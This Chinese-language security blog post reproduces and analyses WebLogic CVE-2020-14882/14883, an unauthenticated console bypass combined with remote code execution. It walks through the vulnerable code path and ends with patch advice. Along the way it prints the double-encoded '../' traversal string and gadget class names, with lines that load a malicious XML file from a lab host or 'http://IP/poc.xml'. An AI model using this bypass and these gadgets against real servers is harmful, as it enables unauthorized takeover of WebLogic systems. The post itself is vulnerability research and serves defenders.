> 原文链接: https://www.anquanke.com//post/id/222018 


# Weblogic未授权访问及命令执行分析复现（CVE-2020-14882/14883）


                                阅读量   
                                **176392**
                            
                        |
                        
                                                                                    



[![](https://p4.ssl.qhimg.com/t014b087bfc13251638.png)](https://p4.ssl.qhimg.com/t014b087bfc13251638.png)



## 一、背景

### 漏洞概述：

WebLogic是美国Oracle公司的主要产品之一，是商业市场上主要的 J2EE 应用服务器软件，也是世界上第一个成功商业化的J2EE应用服务器，在 Java 应用服务器中有非常广泛的部署和应用。10月21日，Oracle官方发布数百个组件的高危漏洞公告。其中组合利用CVE-2020-14882/ CVE-2020-14883可使未经授权的攻击者绕过WebLogic后台登录等限制，最终远程执行代码接管WebLogic服务器，利用难度极低，风险极大。此处漏洞均存在于WebLogic的控制台中。该组件为WebLogic全版本自带组件，并且该漏洞通过HTTP协议进行利用，CVE-2020-14882漏洞允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。

### 漏洞编号：

CVE-2020-14882、CVE-2020-14883

### 漏洞等级：

高危，CVSS评分9.8

### 受影响的版本：

10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0、14.1.1.0.0



## 二、复现

### 复现环境：

本次测试是用的weblogic 10.3.6.0及weblogic12.2.1.3.0，weblogic12.2.1.4.0

[![](https://p2.ssl.qhimg.com/t0143bda889fd4b46a5.png)](https://p2.ssl.qhimg.com/t0143bda889fd4b46a5.png)

[![](https://p0.ssl.qhimg.com/t014f195d74e2c2ddf3.png)](https://p0.ssl.qhimg.com/t014f195d74e2c2ddf3.png)

### 权限绕过漏洞（CVE-2020-14882）复现：

在正常访问console后台时会提示输入帐号密码

[![](https://p0.ssl.qhimg.com/t01acbff4829cc6d6eb.png)](https://p0.ssl.qhimg.com/t01acbff4829cc6d6eb.png)

对于其他路径也限制了访问，可以看到返回403通过未授权访问，则可以绕过验证直接访问后台。

[![](https://p5.ssl.qhimg.com/t01816f90df01f96970.png)](https://p5.ssl.qhimg.com/t01816f90df01f96970.png)

可看到通过未授权访问的后台与正常登陆的后台相比，由于权限不足，缺少部署等功能，无法安装应用，所以也无法通过部署项目等方式直接获取权限。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0128cf762124d292ae.png)

‘%252E%252E%252F’即为二次URL编码过后的‘../’，通过这个就可以实现穿越路径未授权访问相关管理后台

[![](https://p4.ssl.qhimg.com/t012b7ced8838837f79.png)](https://p4.ssl.qhimg.com/t012b7ced8838837f79.png)

### 任意代码执行复现：

利用上述未授权访问CVE-2020-14882结合CVE-2020-14883

**利用方式（一）：**

通过：com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext，这种方法最早在CVE-2019-2725被提出，该方法通用于各版本weblogic。这里首先需要我们构造一个恶意的xml文件，如这里我们自己搭建的[http://10.211.55.2:9999/rce-win.xml](http://10.211.55.2:9999/rce-win.xml)。其次需要被攻击的weblogic能够访问我们的恶意xml。

[![](https://p3.ssl.qhimg.com/t017e250821d84d5c55.png)](https://p3.ssl.qhimg.com/t017e250821d84d5c55.png)

[![](https://p5.ssl.qhimg.com/t010327cdf4350f4317.png)](https://p5.ssl.qhimg.com/t010327cdf4350f4317.png)

其他gadget：

com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext(“[http://IP/poc.xml](http://IP/poc.xml)“)

**利用方式（二）：**

通过com.tangosol.coherence.mvel2.sh.ShellSession，但此利用方法只能在Weblogic 12.2.1及以上版本利用，因为10.3.6并不存在com.tangosol.coherence.mvel2.sh.ShellSession类。

我们可以看到在当前10.3.6版本会提示

[![](https://p4.ssl.qhimg.com/t01496af38fa3d84306.png)](https://p4.ssl.qhimg.com/t01496af38fa3d84306.png)

当使用12版本测试时，即可测试成功

[![](https://p1.ssl.qhimg.com/t01cd4b76d3c587b751.png)](https://p1.ssl.qhimg.com/t01cd4b76d3c587b751.png)

**其他exp：**

比如回显的

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01644b4737002049aa.png)

或者POST形式 ：

[![](https://p5.ssl.qhimg.com/t015b6ed1acf9d87e49.png)](https://p5.ssl.qhimg.com/t015b6ed1acf9d87e49.png)

### 调试分析：

首先，通过静态资源文件绕过路径权限的校验。之后weblogic会对提交的url进行两次url解码。最后会将handle中的参数传入HandleFactory执行任意代码。

从绕过路径权限的校验开始。首先weblogic的请求会经过weblogic.servlet.internal.WebAppServletContext#execute处理，这里会调用securedExecute()

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01cc00727c9b02e2a1.png)

跟进securedExecute，后会调用doSecuredExecute，继续跟进

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0175a65933b10b2563.png)

weblogic.servlet.internal.WebAppServletContext#doSecuredExecute

在这里调用checkAccess进行权限的检查

[![](https://p4.ssl.qhimg.com/t01c8df82bd94070b51.png)](https://p4.ssl.qhimg.com/t01c8df82bd94070b51.png)

进入weblogic.servlet.security.internal.WebAppSecurity#checkAccess()中可以看到当我们请求的路径为/console/console.portal时，checkAllResources为false

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t010708c68b0d64f62f.png)

这里跟进weblogic.servlet.security.internal.WebAppSecurityWLS#getConstraint()

[![](https://p5.ssl.qhimg.com/t014ff704831b744b9e.png)](https://p5.ssl.qhimg.com/t014ff704831b744b9e.png)

这里即比较我们的relURI是否匹配我们matchMap中的路径，并判断rcForAllMethods和rcForOneMethod是否为null

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01922f01907ea61515.png)

当我们的relURI为/console.portal时，rcForAllMethods不为null，rcForOneMethod为null，所以返回了rcForAllMethods。而对应静态资源就不会有限制和校验

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t013083bb64f12ab7e1.png)

接下来回到checkAccess，如果这里是原来的/console.portal时，到这就结束了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01d9152122600800bc.png)

如果使用console/images/console.portal则会继续判断resourceConstraint及后续的isAuthorized，并进入weblogic.servlet.security.internal.ChainedSecurityModule#checkAccess

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01dfe6d48b160611ef.png)

在weblogic.servlet.security.internal.CertSecurityModule#checkUserPerm中会进入hasPermission校验权限

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01bed5ca8d02ac90b8.png)

所以当我们这里使用静态资源路径时，unrestrict值就为true

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0127c49e0e7c5ee635.png)

之后会根据web.xml中的配置对应的AsyncInitServlet来到了weblogic.servlet.AsyncInitServlet#service

[![](https://p2.ssl.qhimg.com/t01aea43f10d981a211.png)](https://p2.ssl.qhimg.com/t01aea43f10d981a211.png)

这里如果解码后的url里没有;，那么就会继续调用super.service

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0173efa0dfe3b613a1.png)

再次进入super.service()

[![](https://p4.ssl.qhimg.com/t011b26fcb74f509b93.png)](https://p4.ssl.qhimg.com/t011b26fcb74f509b93.png)

最终不管哪种请求都会来到doPost，并在这里调用createUIContext

[![](https://p0.ssl.qhimg.com/t01aa9ba4324d34845c.png)](https://p0.ssl.qhimg.com/t01aa9ba4324d34845c.png)

可以看到此时已经经过了一次解码

[![](https://p1.ssl.qhimg.com/t017d3f1a5148fcd6bf.png)](https://p1.ssl.qhimg.com/t017d3f1a5148fcd6bf.png)

随后进入getTree又进行了一次解码，此时requestPattern就变成/css/../console.portal

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t017aba16063cadd391.png)

之后来到com.bea.console.utils.BreadcrumbBacking#init类，进入findFirstHandle

[![](https://p4.ssl.qhimg.com/t017d8e0e7317323bb7.png)](https://p4.ssl.qhimg.com/t017d8e0e7317323bb7.png)

这里会逐个检查参数中是否有handle并将handle的参数内容提取出来返回

[![](https://p5.ssl.qhimg.com/t01ae0a58e418b02489.png)](https://p5.ssl.qhimg.com/t01ae0a58e418b02489.png)

最后将获取到的handleStr作为参数调用HandleFactory.getHandle(handleStr);此时也就来到了代码执行的入口

[![](https://p0.ssl.qhimg.com/t011006ab2859c6351d.png)](https://p0.ssl.qhimg.com/t011006ab2859c6351d.png)

此时传进来的handleStr会在这里被拆成两部分，一个作为被实例化的类，另一个作为该类的构造函数参数及实例化，比如java.lang.String(‘aaaa’)，被拆分成java.lang.String和aaaa

[![](https://p4.ssl.qhimg.com/t01d9959c8330454ef0.png)](https://p4.ssl.qhimg.com/t01d9959c8330454ef0.png)

所以我们就可根据此来构造gadget，最终通过反射机制在此触发

[![](https://p0.ssl.qhimg.com/t01a2262a0f9a824142.png)](https://p0.ssl.qhimg.com/t01a2262a0f9a824142.png)

比如当我们构造了恶意gadget后就变成了这样，随后即可触发rce

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t010e4ad36ad78f4f5b.png)



## 三、修复

目前Oracle官方已发布了最新针对该漏洞的补丁，请受影响用户及时下载补丁程序并安装更新。

Oracle官方补丁需要用户持有正版软件的许可账号，使用该账号登陆[https://support.oracle.com](https://support.oracle.com)后，可以下载最新补丁。

参考链接：[https://www.oracle.com/security-alerts/cpuoct2020.html](https://www.oracle.com/security-alerts/cpuoct2020.html)

在旧版补丁中，使用黑名单过滤，可使用大小写绕过，请更新最新版的补丁，或者如无使用必要可选择关闭console。
